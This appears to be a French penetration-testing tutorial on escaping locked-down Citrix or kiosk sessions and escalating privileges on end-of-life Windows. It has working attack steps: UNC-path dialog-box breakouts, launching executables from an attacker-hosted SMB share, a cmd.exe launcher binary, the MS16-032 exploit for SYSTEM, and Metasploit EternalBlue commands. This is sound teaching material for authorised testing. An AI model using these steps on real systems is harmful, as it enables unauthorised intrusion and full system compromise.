# Environnements restreints et systemes legacy

En pentest, on rencontre regulierement des environnements verrouilles (bureaux Citrix, sessions Terminal Services, kiosques) et des systemes en fin de vie (Windows 7, Server 2008). Ces situations demandent des approches specifiques pour contourner les restrictions ou exploiter l'absence de protections modernes.

## Pourquoi

Les organisations deploient des environnements restreints pour limiter les actions des utilisateurs et reduire la surface d'attaque. Mais ces restrictions reposent souvent sur des mecanismes contournables (Group Policy, restrictions de l'Explorateur). Les systemes legacy, eux, manquent de protections fondamentales presentes dans les versions modernes de Windows (Credential Guard, AMSI, AppLocker). Chaque scenario offre des opportunites d'escalade distinctes.

## Comment ca marche

### Breakout d'environnements restreints

La methodologie de breakout suit trois etapes :

1. **Obtenir une boite de dialogue** (Dialog Box) via une application autorisee
2. **Exploiter la boite de dialogue** pour naviguer dans le systeme de fichiers ou executer des commandes
3. **Escalader les privileges** pour obtenir un acces complet

Les applications avec des fonctions de type Open, Save As, Import, Export ou Help peuvent ouvrir des boites de dialogue qui servent de point de depart.

| Application | Methode d'acces |
|---|---|
| **MS Paint** | File > Open |
| **Notepad / WordPad** | File > Open / Save As |
| **Internet Explorer** | File > Save As / Print |
| **Applications Office** | Insert > Object / File > Open |
| **Help** | Toute fenetre d'aide avec un lien "Open" |

### Contournement des restrictions de chemin

Quand l'acces direct a `C:\` est bloque dans l'Explorateur via Group Policy, les boites de dialogue Windows ignorent souvent ces restrictions. En particulier, les chemins UNC (`\\127.0.0.1\c$\`) permettent de contourner les politiques qui ne bloquent que les lettres de lecteur.

### Systemes legacy : differences de securite

{% tabs %}
{% tab title="Windows Desktop" %}
| Protection | Windows 7 | Windows 10 |
|---|---|---|
| Credential Guard | Non | Oui |
| Remote Credential Guard | Non | Oui |
| Device Guard (code integrity) | Non | Oui |
| AppLocker | Partiel | Oui |
| Windows Defender | Partiel | Oui |
| Control Flow Guard | Non | Oui |
| AMSI | Non | Oui |
{% endtab %}
{% tab title="Windows Server" %}
| Protection | Server 2008 R2 | Server 2012 R2 | Server 2016 | Server 2019 |
|---|---|---|---|---|
| Enhanced ATP | Non | Non | Non | Oui |
| Credential Guard | Non | Non | Oui | Oui |
| Device Guard | Non | Non | Oui | Oui |
| AppLocker | Partiel | Oui | Oui | Oui |
| Windows Defender | Partiel | Partiel | Oui | Oui |
| Control Flow Guard | Non | Non | Oui | Oui |
{% endtab %}
{% endtabs %}

### Dates de fin de support

| Version | Fin de support |
|---|---|
| Windows XP | Avril 2014 |
| Windows Vista | Avril 2017 |
| Windows 7 | Janvier 2020 |
| Windows 8.1 | Janvier 2023 |
| Server 2008 / 2008 R2 | Janvier 2020 |
| Server 2012 / 2012 R2 | Octobre 2023 |
| Server 2016 | Janvier 2027 |
| Server 2019 | Janvier 2029 |

{% hint style="warning" %}
Les systemes en fin de vie ne recoivent plus de correctifs de securite (sauf contrats de support etendu). Chaque nouvelle vulnerabilite decouverte reste non corrigee indefiniment.
{% endhint %}

## En pratique

### Breakout Citrix via boite de dialogue

```powershell
# - Ouvrir une application autorisee (ex: MS Paint)
# Menu Demarrer > Paint

# - Ouvrir la boite de dialogue File > Open

# - Contourner les restrictions de chemin
# Dans le champ "Nom du fichier", entrer un chemin UNC :
# \\127.0.0.1\c$\users\<username>\
# Changer le type de fichier en "All Files"

# Windows resout le chemin UNC et contourne la restriction
# de Group Policy sur les lettres de lecteur
```

### Acces a un partage SMB depuis un environnement restreint

```bash
# - Sur la machine attaquante, demarrer un serveur SMB
smbserver.py -smb2support share $(pwd)

# - Dans l'environnement restreint, ouvrir Paint > File > Open
# Entrer le chemin UNC : \\<IP_ATTAQUANT>\share
# Type de fichier : All Files

# - Les fichiers du partage sont accessibles
# Clic droit > Open sur un executable pour le lancer
```

{% hint style="info" %}
L'Explorateur de fichiers restreint ne permet pas de copier des fichiers directement. Mais les boites de dialogue permettent de lancer des executables par clic droit > Open. Un binaire qui ouvre un `cmd.exe` donne un acces console complet.
{% endhint %}

### Binaire d'acces console

```c
// - Code source minimal pour obtenir un cmd
// Compiler et heberger sur le partage SMB
#include <stdlib.h>
int main() {
    system("cmd.exe");
    return 0;
}

// Compilation :
// x86_64-w64-mingw32-gcc pwn.c -o pwn.exe
```

### Enumeration d'un systeme Windows 7

```bash
# - Capturer les informations systeme
systeminfo > systeminfo.txt

# - Analyser avec WES-NG depuis la machine attaquante
python3 wes.py systeminfo.txt -i 'Elevation of Privilege' --exploits-only

# Les systemes Windows 7 sont generalement vulnerables
# a de nombreuses CVE non corrigees
```

### Enumeration d'un Server 2008 avec Sherlock

```powershell
# - Charger et executer Sherlock
Set-ExecutionPolicy Bypass -Scope Process
Import-Module .\Sherlock.ps1
Find-AllVulns

# Resultats typiques sur un Server 2008 non patche :
# MS10-092 (Task Scheduler .XML) - Appears Vulnerable
# MS16-032 (Secondary Logon) - Appears Vulnerable
# MS17-010 (EternalBlue) - Appears Vulnerable
```

### Exploitation MS16-032 sur Server 2008

```powershell
# - MS16-032 : Secondary Logon Handle Privilege Escalation
# Affecte Server 2008, 2012, Windows 7 (avant le patch)

# - Telecharger et executer le PoC PowerShell
Import-Module .\MS16-032.ps1
Invoke-MS16032

# Resultat : shell SYSTEM
```

### Exploitation EternalBlue (MS17-010) en local

```bash
# - Si le port 445 est accessible uniquement en local
# Faire un port forward depuis la cible
# Puis exploiter depuis la machine attaquante

# - Verification
nmap -p 445 --script smb-vuln-ms17-010 <IP_CIBLE>

# - Exploitation via Metasploit
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <IP_CIBLE>
set LHOST <IP_ATTAQUANT>
run
```

{% hint style="danger" %}
EternalBlue est extremement fiable sur les systemes non patchs, mais peut causer des instabilites. Sur les systemes fragiles (serveurs de production legacy), documenter la vulnerabilite sans l'exploiter et le signaler dans le rapport.
{% endhint %}

## Pieges et galeres

- **UNC et pare-feu** : l'acces aux chemins UNC (`\\127.0.0.1\c$`) peut etre bloque par des regles de pare-feu locales. Essayer d'autres methodes d'acces (lecteurs mappes, chemin direct si accessible)
- **AppLocker dans les environnements restreints** : sur les environnements bien configures, AppLocker bloque l'execution de binaires non autorises. Chercher des LOLBins ou des scripts (`.bat`, `.vbs`) non bloques
- **Systemes legacy et fragilite** : les systemes en fin de vie executent souvent des applications critiques. Confirmer avec le client avant d'exploiter. Un crash peut avoir des consequences graves (hopitaux, systemes industriels)
- **WES-NG et faux positifs** : l'outil compare le niveau de patch avec la base Microsoft mais ne verifie pas si les protections supplementaires (EMET, anti-exploit) sont en place
- **Citrix et journalisation** : les tentatives de breakout peuvent etre loguees. En environnement surveille, privilegier les methodes les moins bruyantes

## Memo express

| Technique | Commande / Methode |
|---|---|
| Boite de dialogue | Paint > File > Open |
| Contournement UNC | `\\127.0.0.1\c$\` dans le champ nom de fichier |
| Partage SMB distant | `smbserver.py -smb2support share $(pwd)` |
| Enumeration legacy | `python3 wes.py systeminfo.txt` |
| Sherlock (Server 2008) | `Import-Module .\Sherlock.ps1; Find-AllVulns` |
| EternalBlue | `nmap --script smb-vuln-ms17-010` |
| Dates de fin de support | Windows 7 : jan 2020, Server 2008 : jan 2020 |

***
